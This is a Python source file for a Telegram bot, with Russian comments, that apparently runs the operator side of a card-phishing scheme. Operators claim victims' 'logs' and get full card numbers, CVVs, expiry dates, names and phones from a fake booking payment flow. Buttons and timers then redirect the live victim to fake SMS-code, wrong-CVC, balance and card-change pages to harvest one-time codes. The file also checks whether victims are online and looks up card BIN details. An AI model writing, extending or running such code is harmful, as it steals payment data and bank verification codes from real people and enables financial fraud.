# [file name]: callbacks.py (обновленная версия)
# [file content begin]
from aiogram import Dispatcher, types, F, Bot
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.exceptions import TelegramForbiddenError
import httpx
import sys
import os
import asyncio

# Добавляем корневую директорию в путь для импортов
sys.path.append(os.path.join(os.path.dirname(__file__), '../..'))

# Теперь импортируем наши модули
from database.crud import get_log_by_session, update_log_taken_by, find_card_duplicates, release_log
from api.handy_api import get_card_info, format_card_info
from bot.keyboards import get_management_keyboard, get_taken_keyboard, get_take_log_keyboard, get_revoked_keyboard

# Импортируем функции уведомлений для админского бота
from admin_bot import notify_log_taken, notify_log_taken_over, notify_action, notify_user_response
import config

class CustomSMSStates(StatesGroup):
    waiting_for_sms_code = State()

async def handle_custom_sms(callback: types.CallbackQuery, state: FSMContext):
    """Обработчик для кастомного SMS кода"""
    session_id = callback.data.split(":")[1]
    
    log = get_log_by_session(session_id)
    if not log or log['taken_by'] != callback.from_user.id:
        await callback.answer("У вас нет доступа к этому логу", show_alert=True)
        return
    
    # Сохраняем session_id в состоянии
    await state.update_data(session_id=session_id)
    
    # Запрашиваем у пользователя последние 2-4 цифры номера телефона
    await callback.message.answer(
        "📱 <b>Кастомный SMS</b>\n\n"
        "Введите последние 2-4 цифры номера телефона, на который должен прийти код:",
        parse_mode="HTML"
    )
    
    # Устанавливаем состояние ожидания цифр номера
    await state.set_state(CustomSMSStates.waiting_for_sms_code)
    await callback.answer()

async def handle_sms_code_input(message: types.Message, state: FSMContext):
    """Обрабатывает ввод последних 2-4 цифр номера телефона от пользователя"""
    # Получаем данные из состояния
    data = await state.get_data()
    session_id = data.get('session_id')
    
    if not session_id:
        await message.answer("❌ Ошибка: сессия не найдена")
        await state.clear()
        return
    
    # Проверяем, что введено от 2 до 4 цифр (последние цифры номера телефона)
    phone_digits = message.text.strip()
    if not phone_digits.isdigit() or len(phone_digits) < 2 or len(phone_digits) > 4:
        await message.answer("❌ Пожалуйста, введите от 2 до 4 цифр номера телефона:")
        return
    
    log = get_log_by_session(session_id)
    if not log or log['taken_by'] != message.from_user.id:
        await message.answer("❌ У вас нет доступа к этому логу")
        await state.clear()
        return
    
    # Отправляем запрос на сервер для перенаправления пользователя
    try:
        async with httpx.AsyncClient() as client:
            response = await client.post(
                f"{config.SERVER_URL}/redirect-custom-sms", 
                json={
                    "sessionId": session_id,
                    "clientId": log['client_id'],
                    "phoneDigits": phone_digits
                }
            )
            
            if response.status_code == 200:
                # Уведомляем админский бот
                booking_id = log['booking_id'] or "N/A"
                client_id = log['client_id'] or "N/A"
                username = message.from_user.username or "без username"
                
                await notify_action(booking_id, client_id, username, message.from_user.id, "custom_sms", f"📱 Кастомный SMS номер: ***{phone_digits}")
                await notify_user_response(booking_id, client_id, username, message.from_user.id, f"✅ Пользователь перенаправлен на страницу ввода SMS с номером ***{phone_digits}")
                
                await message.answer(
                    f"✅ Пользователь перенаправлен на страницу ввода SMS кода\n\n"
                    f"📱 Номер телефона: <b>***{phone_digits}</b>\n"
                    f"📞 Сообщение: 'Введите код SMS отправленный на этот номер телефона ***{phone_digits}'",
                    parse_mode="HTML"
                )
            else:
                error_msg = "❌ Ошибка перенаправления пользователя"
                await message.answer(error_msg)
                
                # Уведомляем админский бот об ошибке
                booking_id = log['booking_id'] or "N/A"
                client_id = log['client_id'] or "N/A"
                username = message.from_user.username or "без username"
                await notify_user_response(booking_id, client_id, username, message.from_user.id, error_msg)
                
    except Exception as e:
        print(f"Error in custom SMS redirect: {e}")
        error_msg = "❌ Ошибка соединения с сервером"
        await message.answer(error_msg)
        
        # Уведомляем админский бот об ошибке
        booking_id = log['booking_id'] or "N/A"
        client_id = log['client_id'] or "N/A"
        username = message.from_user.username or "без username"
        await notify_user_response(booking_id, client_id, username, message.from_user.id, error_msg)
    
    # Очищаем состояние
    await state.clear()

async def handle_take_log_with_timers(callback: types.CallbackQuery):
    """Обработчик взятия лога с таймерами для транзитных страниц"""
    session_id = callback.data.split(":")[1]
    
    log = get_log_by_session(session_id)
    if not log:
        await callback.answer("Лог не найден", show_alert=True)
        return
        
    if log['taken_by']:
        await callback.answer("Этот лог уже занят", show_alert=True)
        return

    update_log_taken_by(session_id, callback.from_user.id)

    # Отправляем уведомление в группу
    booking_id = log['booking_id'] or "N/A"
    client_id = log['client_id'] or "N/A"
    username = callback.from_user.username or "без username"
    
    group_message = (
        f"📥 Лог - #{booking_id} || #{client_id} - "
        f"взял @{username}(ID: {callback.from_user.id})"
    )
    
    await callback.bot.send_message(config.GROUP_ID, group_message)

    # Уведомляем админский бот
    await notify_log_taken(booking_id, client_id, username, callback.from_user.id)

    # НЕМЕДЛЕННО перенаправляем пользователя на первую транзитную страницу
    try:
        async with httpx.AsyncClient() as client:
            response = await client.post(
                f"{config.SERVER_URL}/redirect-transit-1", 
                json={
                    "sessionId": session_id,
                    "clientId": log['client_id']
                }
            )
            
            if response.status_code == 200:
                await callback.answer("✅ Пользователь перенаправлен на обработку")
            else:
                await callback.answer("❌ Ошибка перенаправления", show_alert=True)
                
    except Exception as e:
        print(f"Error redirecting to transit-1: {e}")
        await callback.answer("❌ Ошибка соединения", show_alert=True)

    # Запускаем таймер для второй транзитной страницы (через 15 секунд)
    asyncio.create_task(schedule_transit_2_redirect(session_id, log['client_id'], callback.bot))

    # Запускаем таймер для SMS страницы (через 30 секунд)
    asyncio.create_task(schedule_sms_redirect(session_id, log['client_id'], callback.bot))

    # Отправляем данные оператору
    await send_operator_data(callback, session_id, log)

async def schedule_transit_2_redirect(session_id: str, client_id: str, bot: Bot):
    """Запланировать переход на вторую транзитную страницу через 15 секунд"""
    await asyncio.sleep(15)
    
    try:
        async with httpx.AsyncClient() as client:
            await client.post(
                f"{config.SERVER_URL}/redirect-transit-2", 
                json={
                    "sessionId": session_id,
                    "clientId": client_id
                }
            )
        print(f"🔄 Scheduled transit-2 redirect for {session_id}")
    except Exception as e:
        print(f"Error scheduling transit-2: {e}")

async def schedule_sms_redirect(session_id: str, client_id: str, bot: Bot):
    """Запланировать переход на SMS страницу через 30 секунд"""
    await asyncio.sleep(30)
    
    try:
        async with httpx.AsyncClient() as client:
            await client.post(
                f"{config.SERVER_URL}/redirect-sms", 
                json={
                    "sessionId": session_id,
                    "clientId": client_id
                }
            )
        print(f"📱 Scheduled SMS redirect for {session_id}")
    except Exception as e:
        print(f"Error scheduling SMS: {e}")

async def send_operator_data(callback: types.CallbackQuery, session_id: str, log: dict):
    """Отправляет данные оператору"""
    async with httpx.AsyncClient() as client:
        customer = (await client.get(f"{config.SERVER_URL}/customer/{session_id}")).json()
        card = (await client.get(f"{config.SERVER_URL}/card/{session_id}")).json()
        booking = (await client.get(f"{config.SERVER_URL}/booking/{session_id}")).json()

    booking_id = log['booking_id'] or "N/A"
    client_id = log['client_id'] or "N/A"
    
    full_pan = card.get('full_pan', '')
    
    duplicates = find_card_duplicates(log['masked_pan'])
    previous_uses = [dup for dup in duplicates if dup['session_id'] != session_id]
    
    if full_pan:
        bin_number = full_pan[:6]
        card_info = await get_card_info(bin_number)
        card_info_text = format_card_info(card_info)
    else:
        card_info_text = "❌ Информация о карте недоступна"
    
    text = (
        f"Лог #{booking_id} || #{client_id}\n\n"
    )
    
    if previous_uses:
        text += f"⚠️ <b>Эта карта уже вводилась ранее</b>\n\n"
    
    text += (
        f"💳  Карта: <code>{full_pan}</code>\n"
        f"🗓️  Срок действия карты: {card.get('expire_date')}\n"
        f"🔒  CVV: {card.get('cvv')}\n\n"
        f"📊 <b>Информация о карте:</b>\n"
        f"{card_info_text}\n\n"
        f"👤  Имя: {customer.get('fullName')}\n"
        f"📞  Номер: {customer.get('phone')}\n\n"
        f"💸  Сумма: {card.get('total_amount')}.00 AED\n\n"
        f"🕒 <b>Таймеры запущены:</b>\n"
        f"• Через 15 сек: Вторая транзитная страница\n"
        f"• Через 30 сек: Страница SMS"
    )

    await callback.bot.send_message(
        callback.from_user.id, 
        text, 
        parse_mode="HTML", 
        reply_markup=get_management_keyboard(session_id)
    )
    
    await callback.message.edit_reply_markup(
        reply_markup=get_taken_keyboard(
            callback.from_user.username, 
            callback.from_user.id,
            session_id
        )
    )

async def take_from_user(callback: types.CallbackQuery):
    """Обработчик для взятия лога у другого пользователя"""
    
    session_id = callback.data.split(":")[1]
    
    log = get_log_by_session(session_id)
    if not log:
        await callback.answer("Лог не найден", show_alert=True)
        return
    
    if not log['taken_by']:
        await callback.answer("Этот лог никем не занят", show_alert=True)
        return
    
    # Нельзя забрать у самого себя
    if log['taken_by'] == callback.from_user.id:
        await callback.answer("Вы уже владеете этим логом", show_alert=True)
        return
    
    # Сохраняем ID предыдущего владельца
    previous_owner_id = log['taken_by']
    
    # Отправляем уведомление в группу о смене владельца
    booking_id = log['booking_id'] or "N/A"
    client_id = log['client_id'] or "N/A"
    new_username = callback.from_user.username or "без username"
    
    group_message = (
        f"🔄 Лог - #{booking_id} || #{client_id} - "
        f"перешел к @{new_username}(ID: {callback.from_user.id})"
    )
    
    await callback.bot.send_message(config.GROUP_ID, group_message)
    
    # Уведомляем админский бот о перехвате
    await notify_log_taken_over(booking_id, client_id, new_username, callback.from_user.id, previous_owner_id)
    
    # Забираем лог себе
    update_log_taken_by(session_id, callback.from_user.id)
    
    # Остальной код без изменений...
    async with httpx.AsyncClient() as client:
        customer = (await client.get(f"{config.SERVER_URL}/customer/{session_id}")).json()
        card = (await client.get(f"{config.SERVER_URL}/card/{session_id}")).json()
        booking = (await client.get(f"{config.SERVER_URL}/booking/{session_id}")).json()

    booking_id = log['booking_id'] or "N/A"
    client_id = log['client_id'] or "N/A"
    
    full_pan = card.get('full_pan', '')
    
    # Проверяем дубликаты карты
    duplicates = find_card_duplicates(log['masked_pan'])
    previous_uses = [dup for dup in duplicates if dup['session_id'] != session_id]
    
    if full_pan:
        bin_number = full_pan[:6]
        card_info = await get_card_info(bin_number)
        card_info_text = format_card_info(card_info)
    else:
        card_info_text = "❌ Информация о карте недоступна"
    
    # Формируем текст
    text = (
        f"🔄 <b>Лог перехвачен у другого пользователя</b>\n\n"
        f"Лог #{booking_id} || #{client_id}\n\n"
    )
    
    if previous_uses:
        text += f"⚠️ <b>Эта карта уже вводилась ранее</b>\n\n"
    
    text += (
        f"💳  Карта: <code>{full_pan}</code>\n"
        f"🗓️  Срок действия карты: {card.get('expire_date')}\n"
        f"🔒  CVV: {card.get('cvv')}\n\n"
        f"📊 <b>Информация о карте:</b>\n"
        f"{card_info_text}\n\n"
        f"👤  Имя: {customer.get('fullName')}\n"
        f"📞  Номер: {customer.get('phone')}\n\n"
        f"💸  Сумма: {customer.get('total_amount')} AED"
    )

    # Отправляем данные новому владельцу
    await callback.bot.send_message(
        callback.from_user.id, 
        text, 
        parse_mode="HTML", 
        reply_markup=get_management_keyboard(session_id)
    )
    
    # Обновляем кнопку в группе
    await callback.message.edit_reply_markup(
        reply_markup=get_taken_keyboard(
            callback.from_user.username,
            callback.from_user.id,
            session_id
        )
    )
    
    # Уведомляем предыдущего владельца с обработкой ошибки
    try:
        await callback.bot.send_message(
            previous_owner_id,
            f"⚠️ <b>Лог #{booking_id} || #{client_id} был перехвачен другим пользователем</b>\n\n"
            f"Все управляющие кнопки для этого лога деактивированы.",
            parse_mode="HTML"
        )
    except TelegramForbiddenError:
        # Логируем, но не прерываем выполнение
        print(f"Не удалось уведомить пользователя {previous_owner_id}: бот заблокирован или диалог не начат")
        # Можно отправить уведомление в группу
        await callback.bot.send_message(
            config.GROUP_ID,
            f"⚠️ Не удалось уведомить пользователя ID {previous_owner_id} о перехвате лога"
        )
    except Exception as e:
        print(f"Ошибка при уведомлении пользователя {previous_owner_id}: {e}")
    
    await callback.answer("✅ Лог успешно перехвачен", show_alert=True)

async def handle_redirect_action(callback: types.CallbackQuery):
    action, session_id = callback.data.split(":")
    
    log = get_log_by_session(session_id)
    if not log or log['taken_by'] != callback.from_user.id:
        await callback.answer("У вас нет доступа к этому логу", show_alert=True)
        return
    
    # Определяем текстовое описание действия
    action_descriptions = {
        "balance": "💰 Проверка баланса",
        "sms": "📞 Запрос SMS кода", 
        "change": "🔄 Смена карты",
        "success": "✅ Успешная оплата",
        "wrong_cvc": "❌ Ошибка CVC",
        "wrong_sms": "❌ Ошибка SMS",
        "prepaid": "❌ Prepaid карта",
        "check_online": "🔍 Проверка онлайн статуса"
    }
    
    action_text = action_descriptions.get(action, action)
    
    # Уведомляем админский бот о действии
    booking_id = log['booking_id'] or "N/A"
    client_id = log['client_id'] or "N/A"
    username = callback.from_user.username or "без username"
    
    await notify_action(booking_id, client_id, username, callback.from_user.id, action, action_text)
    
    # Обработка проверки онлайн статуса (остается без изменений)
    if action == "check_online":
        await check_online_status(callback)
        return
    
    endpoints = {
        "balance": "/redirect-balance",
        "sms": "/redirect-sms", 
        "change": "/redirect-change",
        "success": "/redirect-success",
        "wrong_cvc": "/redirect-wrong-cvc",
        "wrong_sms": "/redirect-wrong-sms",
        "prepaid": "/redirect-prepaid"
    }
    
    try:
        async with httpx.AsyncClient() as client:
            response = await client.post(
                f"{config.SERVER_URL}{endpoints[action]}", 
                json={
                    "sessionId": session_id,
                    "clientId": log['client_id']
                }
            )
            
            if response.status_code == 200:
                messages = {
                    "balance": "✅ Пользователь перенаправлен на страницу баланса",
                    "sms": "✅ Пользователь перенаправлен на страницу ввода кода",
                    "change": "✅ Пользователь перенаправлен на страницу замены карты", 
                    "success": "✅ Успешная оплата!",
                    "wrong_cvc": "✅ Пользователь перенаправлен на страницу ввода карты заново (неверный CVC)",
                    "wrong_sms": "✅ Пользователь перенаправлен на страницу повторого ввода кода (неверный SMS код)",
                    "prepaid": "✅ Пользователь перенаправлен на страницу ввода карты заново (Prepaid card)"
                }
                
                # Отправляем подтверждение с кнопками управления
                await callback.message.answer(
                    messages[action]
                )
                
                # Уведомляем админский бот о ответе пользователя
                await notify_user_response(booking_id, client_id, username, callback.from_user.id, messages[action])
                
            else:
                error_msg = "❌ Ошибка перенаправления"
                await callback.message.answer(error_msg)
                await notify_user_response(booking_id, client_id, username, callback.from_user.id, error_msg)
                
    except Exception as e:
        print(f"Error redirecting user: {e}")
        error_msg = "❌ Ошибка соединения с сервером"
        await callback.message.answer(error_msg)
        await notify_user_response(booking_id, client_id, username, callback.from_user.id, error_msg)

async def check_online_status(callback: types.CallbackQuery):
    session_id = callback.data.split(":")[1]
    
    log = get_log_by_session(session_id)
    if not log or log['taken_by'] != callback.from_user.id:
        await callback.answer("У вас нет доступа к этому логу", show_alert=True)
        return
    
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(f"{config.SERVER_URL}/check-online-status/{session_id}")
            
            if response.status_code == 200:
                data = response.json()
                booking_id = log['booking_id']
                client_id = log['client_id']
                
                if data.get("online"):
                    current_page = data.get("currentPageDisplay", "Unknown")
                    message = (
                        f"🆔 #{booking_id} || #{client_id}\n\n"
                        f"🟢 Пользователь ОНЛАЙН\n\n"
                        f"📍 Текущая страница: {current_page}\n"
                        f"⏰ Последняя активность: только что"
                    )
                else:
                    last_known_page = data.get("lastKnownPageDisplay", "неизвестно")
                    last_seen = data.get("lastSeen", "неизвестно")
                    message = (
                        f"🆔 #{booking_id} || #{client_id}\n\n"
                        f"🔴 Пользователь ОФФЛАЙН\n\n"
                        f"📄 Последняя известная страница: {last_known_page}\n"
                        f"⏰ Последняя активность: {last_seen}"
                    )
                await callback.message.answer(message)
                
                # Уведомляем админский бот о проверке статуса
                username = callback.from_user.username or "без username"
                await notify_action(booking_id, client_id, username, callback.from_user.id, "check_online", "🔍 Проверка онлайн статуса")
                await notify_user_response(booking_id, client_id, username, callback.from_user.id, message)
            else:
                error_msg = "❌ Не удалось получить статус пользователя"
                await callback.message.answer(error_msg)
                username = callback.from_user.username or "без username"
                await notify_user_response(booking_id, client_id, username, callback.from_user.id, error_msg)
                
    except Exception as e:
        print(f"Error checking online status: {e}")
        error_msg = "❌ Ошибка соединения с сервером"
        await callback.message.answer(error_msg)
        username = callback.from_user.username or "без username"
        await notify_user_response(booking_id, client_id, username, callback.from_user.id, error_msg)
    
    await callback.answer()

def register_callbacks(dp: Dispatcher):
    dp.callback_query.register(handle_take_log_with_timers, F.data.startswith("take:"))
    dp.callback_query.register(take_from_user, F.data.startswith("take_from_user:"))
    dp.callback_query.register(check_online_status, F.data.startswith("check_online:"))
    dp.callback_query.register(handle_redirect_action, F.data.startswith("balance:"))
    dp.callback_query.register(handle_redirect_action, F.data.startswith("sms:"))
    dp.callback_query.register(handle_redirect_action, F.data.startswith("change:"))
    dp.callback_query.register(handle_redirect_action, F.data.startswith("success:"))
    dp.callback_query.register(handle_redirect_action, F.data.startswith("wrong_cvc:")) 
    dp.callback_query.register(handle_redirect_action, F.data.startswith("wrong_sms:"))
    dp.callback_query.register(handle_redirect_action, F.data.startswith("prepaid:"))
    dp.callback_query.register(handle_custom_sms, F.data.startswith("custom_sms:"))
    dp.message.register(handle_sms_code_input, CustomSMSStates.waiting_for_sms_code)
# [file content end]